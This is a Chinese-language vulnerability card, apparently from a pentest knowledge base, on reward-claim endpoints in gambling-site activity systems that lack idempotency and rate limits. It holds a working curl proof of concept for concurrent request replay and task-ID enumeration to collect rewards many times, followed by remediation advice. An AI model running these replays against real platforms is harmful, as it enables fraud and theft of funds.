---
title: 签到 / 任务奖励批量刷取（缺幂等与频率控制）
cve: 无（业务逻辑）
severity: high
cvss: 7.8
product: 自研活动系统（博彩/包网）
versions: 任意
ports: 80, 443
keywords: 签到, 任务, 奖励, 刷取, 幂等, 并发
entry: /api/activity/sign、/api/task/claim
verified: false
sources: 公开资料整理（业务逻辑类，无 CVE）
---

## 指纹

```
POST /api/activity/sign     {"actId":1}
POST /api/task/claim        {"taskId":12}
GET  /api/activity/list
```

## 前置条件

- 一个普通账号；抓到签到/领奖请求。

## PoC

```bash
# 1) 正常签一次，记下余额
curl -s -X POST https://target/api/activity/sign -H "Authorization: Bearer <t>" -d '{"actId":1}'

# 2) 并发重放 20 次（不换参数）——幂等缺失就会重复到账
for i in $(seq 1 20); do
  curl -s -X POST https://target/api/activity/sign -H "Authorization: Bearer <t>" -d '{"actId":1}' &
done; wait
# 判定：余额增加 = 20 倍签到奖励 = 命中

# 3) 换 actId 遍历未开放活动
for a in $(seq 1 50); do curl -s -X POST https://target/api/task/claim -H "Authorization: Bearer <t>" -d "{\"taskId\":$a}"; done
```

## 利用步骤

1. 先单次确认基线；
2. 并发重放（HTTP/2 单包更稳，或用 xargs -P）；
3. 换 actId/taskId 遍历，找"未开始/已结束"的活动；
4. 证据：余额前后对比 + 请求计数（只刷到能证明危害即可，别真提现）。

## 修复与缓解

- 领取记录唯一索引（user_id + act_id + 日期）；接口加分布式锁与频率限制。
- 活动状态机校验（未开始/已结束直接拒）。

## 参考

- OWASP WSTG-BUSL-04；CWE-837。
